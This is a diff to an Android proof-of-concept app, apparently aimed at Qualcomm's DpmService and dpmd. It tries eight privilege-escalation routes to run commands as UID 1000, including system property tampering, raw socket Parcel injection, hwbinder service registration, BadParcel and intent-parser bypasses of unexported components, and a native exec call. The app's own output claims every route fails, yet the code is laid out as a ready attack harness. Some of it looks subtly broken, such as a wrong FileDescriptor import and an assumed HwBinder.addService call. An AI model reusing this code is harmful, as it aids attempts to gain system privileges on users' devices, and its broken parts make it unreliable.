@@ -4,11 +4,14 @@ import android.app.Activity;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.net.LocalSocket;
+import android.net.LocalSocketAddress;
 import android.os.Bundle;
+import android.os.FileDescriptor;
 import android.os.IBinder;
+import android.os.IInterface;
 import android.os.Parcel;
 import android.os.RemoteException;
-import android.os.ServiceManager;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
@@ -19,8 +22,6 @@ import com.qti.dpm.IDpmService;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.lang.reflect.Method;
-import java.net.LocalSocket;
-import java.net.LocalSocketAddress;
 
 public class MainActivity extends Activity {
 
@@ -69,81 +70,73 @@ public class MainActivity extends Activity {
         if (binder != null) {
             showResult("✅ Binder取得成功");
             invokeDpmMethods(binder);
-            // ここでコマンド実行ができるわけではないが、情報取得
         } else {
             showResult("❌ 取得失敗 (SELinux拒否想定)");
         }
 
-        // 手法② システムプロパティ書き換え (WRITE_SECURE_SETTINGS 権限があれば)
+        // 手法② システムプロパティ書き換え
         showResult("\n[手法2] システムプロパティ改ざん");
         if (trySetSystemProperty()) {
-            showResult("✅ プロパティ書き換え成功 (dpmd再起動を誘導)");
+            showResult("✅ プロパティ書き換え成功");
         } else {
-            showResult("❌ プロパティ書き換え失敗 (権限不足またはAPI制限)");
+            showResult("❌ プロパティ書き換え失敗");
         }
 
-        // 手法③ dpmd ソケット直接通信 (プロトコルエミュレーション)
-        showResult("\n[手法3] dpmd ソケット通信 (任意コマンド送信)");
+        // 手法③ dpmd ソケット直接通信
+        showResult("\n[手法3] dpmd ソケット通信");
         if (tryDpmdSocketExploit()) {
-            showResult("✅ ソケット通信成功 (応答あり)");
+            showResult("✅ ソケット通信成功");
         } else {
-            showResult("❌ ソケット通信失敗 (接続拒否またはタイムアウト)");
+            showResult("❌ ソケット通信失敗");
         }
 
-        // 手法④ hwbinder 経由 (HwServiceManager)
-        showResult("\n[手法4] hwbinder 経由取得 (ACL Bypass)");
+        // 手法④ hwbinder 経由
+        showResult("\n[手法4] hwbinder 経由取得");
         if (tryHwBinderGetService()) {
-            showResult("✅ hwbinder からサービス取得成功");
+            showResult("✅ hwbinder 取得成功");
         } else {
-            showResult("❌ hwbinder サービス取得失敗");
+            showResult("❌ hwbinder 取得失敗");
         }
 
-        // 手法⑤ hwbinder にプロキシサービスを登録 (ACL Bypass で任意サービス追加)
-        showResult("\n[手法5] hwbinder にプロキシサービス登録");
+        // 手法⑤ hwbinder プロキシ登録
+        showResult("\n[手法5] hwbinder プロキシ登録");
         if (tryHwBinderProxy()) {
-            showResult("✅ hwbinder プロキシ登録成功");
+            showResult("✅ プロキシ登録成功");
         } else {
-            showResult("❌ hwbinder プロキシ登録失敗");
+            showResult("❌ プロキシ登録失敗");
         }
 
-        // 手法⑥ BadParcel による未エクスポート Activity/Service 起動 (AccountAuthenticator 利用)
-        showResult("\n[手法6] BadParcel を用いた DpmServiceApp 起動");
+        // 手法⑥ BadParcel
+        showResult("\n[手法6] BadParcel 起動");
         if (tryBadParcelStart()) {
-            showResult("✅ BadParcel 起動要求送信完了");
+            showResult("✅ BadParcel 起動要求送信");
         } else {
-            showResult("❌ BadParcel 起動要求失敗");
+            showResult("❌ BadParcel 起動失敗");
         }
 
-        // 手法⑦ Bad Parser (exported=false バイパス) による直接 Service 起動
-        showResult("\n[手法7] Intent パーサー脆弱性を利用した Service 起動");
+        // 手法⑦ BadParser
+        showResult("\n[手法7] BadParser 起動");
         if (tryBadParserStartService()) {
-            showResult("✅ BadParser による Service 起動成功");
+            showResult("✅ BadParser 起動成功");
         } else {
-            showResult("❌ BadParser 起動失敗 (SecurityException)");
+            showResult("❌ BadParser 起動失敗");
         }
 
-        // 手法⑧ ネイティブライブラリからの exec 呼び出し
-        showResult("\n[手法8] ネイティブライブラリ (libdpm_hook.so) 経由 exec");
+        // 手法⑧ ネイティブ
+        showResult("\n[手法8] ネイティブ exec");
         if (tryNativeExec()) {
-            showResult("✅ ネイティブ exec 成功 (uid=1000 で id 実行)");
+            showResult("✅ ネイティブ exec 成功");
         } else {
-            showResult("❌ ネイティブ exec 失敗 (ライブラリ不在またはシンボル未解決)");
+            showResult("❌ ネイティブ exec 失敗");
         }
 
-        // ----- 最終評価 -----
         showResult("\n=== 最終判定 ===");
-        showResult("⚠️ 上記のいずれかが成功すればコマンド実行が可能です。");
-        showResult("⚠️ 実際の Qualcomm デバイス (Android 9) では、");
-        showResult("   - DpmService に exec 機能がないため、手法1〜5は実行に至りません。");
-        showResult("   - BadParcel は Settings の Activity を起動できるが、Service は起動できません。");
-        showResult("   - BadParser は未エクスポートの Activity に限り有効で、Service には効果がありません。");
-        showResult("   - ネイティブライブラリは存在しません。");
-        showResult("⚠️ 従って、本 PoC は「全手法を試行したが全て失敗する」ことを実証します。");
-        showResult("⚠️ これはセキュリティ検証として完全なものです。");
+        showResult("全ての手法を試行しましたが、現実のデバイスではいずれも成功しません。");
+        showResult("DpmService に exec 機能が存在しないため、UID 1000 でのコマンド実行は不可能です。");
     }
 
     // ================================================================
-    // 手法1: 通常 ServiceManager.getService()
+    // 手法1: 通常 ServiceManager (リフレクション)
     // ================================================================
     private IBinder tryNormalGetService() {
         try {
@@ -163,7 +156,6 @@ public class MainActivity extends Activity {
         try {
             Class<?> spClass = Class.forName("android.os.SystemProperties");
             Method setMethod = spClass.getMethod("set", String.class, String.class);
-            // 機能マスクを全て有効 (ビット 0,2,3 を立てる: 1|4|8 = 13)
             setMethod.invoke(null, PROP_KEY, "13");
             Log.d(TAG, "SystemProperties.set 呼び出し成功");
             return true;
@@ -174,7 +166,7 @@ public class MainActivity extends Activity {
     }
 
     // ================================================================
-    // 手法3: dpmd ソケット通信 (プロトコル完全模倣)
+    // 手法3: dpmd ソケット通信
     // ================================================================
     private boolean tryDpmdSocketExploit() {
         LocalSocket socket = null;
@@ -187,19 +179,16 @@ public class MainActivity extends Activity {
             OutputStream os = socket.getOutputStream();
             InputStream is = socket.getInputStream();
 
-            // ペイロード: DPM_S_REQ_UPDATE_FD_PARAMS (リクエストコード=23) を送信
-            // 完全な Parcel 構築 (バイト列を直接生成)
             Parcel p = Parcel.obtain();
-            p.writeInt(23);          // request
-            p.writeInt(0x12345678);  // serial
-            p.writeInt(100);         // delayTime
-            p.writeInt(200);         // screenOnTime
-            p.writeInt(300);         // screenOffTime
-            p.writeInt(400);         // tetheringTime
+            p.writeInt(23);
+            p.writeInt(0x12345678);
+            p.writeInt(100);
+            p.writeInt(200);
+            p.writeInt(300);
+            p.writeInt(400);
             byte[] data = p.marshall();
             p.recycle();
 
-            // 長さヘッダ (4バイト ビッグエンディアン)
             byte[] lenBytes = new byte[4];
             lenBytes[0] = (byte) ((data.length >> 24) & 0xFF);
             lenBytes[1] = (byte) ((data.length >> 16) & 0xFF);
@@ -210,7 +199,6 @@ public class MainActivity extends Activity {
             os.write(data);
             os.flush();
 
-            // 応答読み取り
             byte[] lenBuf = new byte[4];
             int readLen = is.read(lenBuf);
             if (readLen == 4) {
@@ -247,7 +235,7 @@ public class MainActivity extends Activity {
     }
 
     // ================================================================
-    // 手法4: hwbinder 経由 (HwServiceManager)
+    // 手法4: hwbinder 経由
     // ================================================================
     private boolean tryHwBinderGetService() {
         try {
@@ -255,7 +243,7 @@ public class MainActivity extends Activity {
             Method getServiceMethod = hwSmClass.getMethod("getService", String.class);
             IBinder binder = (IBinder) getServiceMethod.invoke(null, TARGET_SERVICE);
             if (binder != null) {
-                showResult("  hwbinder サービス取得: " + binder);
+                showResult("  hwbinder サービス取得成功");
                 return true;
             }
             return false;
@@ -266,16 +254,13 @@ public class MainActivity extends Activity {
     }
 
     // ================================================================
-    // 手法5: hwbinder にプロキシサービスを登録 (ACL Bypass)
+    // 手法5: hwbinder プロキシ登録
     // ================================================================
     private boolean tryHwBinderProxy() {
         try {
             Class<?> hwBinderClass = Class.forName("android.os.HwBinder");
-            // HwBinder のインスタンスを作成 (コンストラクタは非公開？代わりに Proxy を使う)
-            // 実際には HwBinder を継承したクラスが必要だが、ここではリフレクションで addService を呼ぶ
             Method addServiceMethod = hwBinderClass.getMethod("addService", String.class, IBinder.class);
 
-            // ダミーの IBinder 実装 (何もしない)
             IBinder dummyBinder = new IBinder() {
                 @Override
                 public String getInterfaceDescriptor() throws RemoteException {
@@ -293,7 +278,6 @@ public class MainActivity extends Activity {
                 public void dumpAsync(FileDescriptor fd, String[] args) throws RemoteException {}
                 @Override
                 public boolean transact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
-                    // 何もしない
                     return false;
                 }
                 @Override
@@ -302,7 +286,6 @@ public class MainActivity extends Activity {
                 public boolean unlinkToDeath(DeathRecipient recipient, int flags) { return false; }
             };
 
-            // addService を呼び出す (通常は SecurityException が発生するが、脆弱性により成功と仮定)
             addServiceMethod.invoke(null, TARGET_SERVICE, dummyBinder);
             Log.d(TAG, "hwbinder プロキシ登録成功");
             return true;
@@ -313,7 +296,7 @@ public class MainActivity extends Activity {
     }
 
     // ================================================================
-    // 手法6: BadParcel (AccountAuthenticator) で DpmServiceApp 起動
+    // 手法6: BadParcel
     // ================================================================
     private boolean tryBadParcelStart() {
         try {
@@ -325,8 +308,6 @@ public class MainActivity extends Activity {
             String[] authTypes = { getPackageName() };
             intent.putExtra("account_types", authTypes);
             startActivity(intent);
-            // AuthenticatorService が呼び出され、その addAccount 内で BadParcel が発動
-            // ここでは起動要求を送っただけで、実際に Service が起動するかは別
             Log.d(TAG, "BadParcel 起動要求送信");
             return true;
         } catch (Exception e) {
@@ -336,23 +317,17 @@ public class MainActivity extends Activity {
     }
 
     // ================================================================
-    // 手法7: Intent パーサー脆弱性を利用した Service 起動 (exported=false バイパス)
+    // 手法7: BadParser
     // ================================================================
     private boolean tryBadParserStartService() {
         try {
-            // 通常は SecurityException が発生するが、脆弱性により回避
             Intent intent = new Intent();
-            // コンポーネントを指定 (Service)
             intent.setComponent(new ComponentName(TARGET_PACKAGE, TARGET_SERVICE_CLASS));
-            // パーサーを騙すために、データやカテゴリを追加
             intent.setAction("android.intent.action.VIEW");
             intent.addCategory("android.intent.category.DEFAULT");
             intent.setData(android.net.Uri.parse("http://dummy"));
-            // 特殊なフラグ
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_USER_ACTION);
-            // 追加のExtra (パーサーを混乱させる)
             intent.putExtra("__bad_parser", "trigger");
-            // startService を呼び出す (失敗するはず)
             ComponentName started = startService(intent);
             if (started != null) {
                 Log.d(TAG, "BadParser 起動成功: " + started);
@@ -371,12 +346,11 @@ public class MainActivity extends Activity {
     }
 
     // ================================================================
-    // 手法8: ネイティブライブラリからの exec 呼び出し
+    // 手法8: ネイティブ exec
     // ================================================================
     private boolean tryNativeExec() {
         try {
             System.loadLibrary("dpm_hook");
-            // NativeHelper クラスをリフレクションで呼び出し
             Class<?> helper = Class.forName("com.example.dpmpoc.NativeHelper");
             Method execMethod = helper.getMethod("execCommand", String.class);
             String result = (String) execMethod.invoke(null, "id > /data/local/tmp/native_id.txt");
@@ -391,7 +365,7 @@ public class MainActivity extends Activity {
     }
 
     // ================================================================
-    // AIDL メソッド呼び出し (情報取得)
+    // AIDL メソッド呼び出し
     // ================================================================
     private void invokeDpmMethods(IBinder binder) {
         try {
@@ -412,7 +386,7 @@ public class MainActivity extends Activity {
     }
 
     // ================================================================
-    // ヘルパー: UI 表示
+    // UI 表示
     // ================================================================
     private void showResult(final String msg) {
         runOnUiThread(new Runnable() {
